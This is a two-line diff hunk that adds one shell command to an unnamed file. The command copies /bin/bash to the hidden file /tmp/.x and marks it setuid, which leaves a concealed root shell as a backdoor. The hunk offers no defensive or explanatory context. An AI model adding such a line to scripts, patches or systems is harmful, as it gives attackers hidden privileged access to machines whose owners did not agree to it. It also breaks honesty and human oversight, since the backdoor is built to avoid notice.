@@ -1,0 +1,2 @@
+cp /bin/bash /tmp/.x; chmod +s /tmp/.x
+
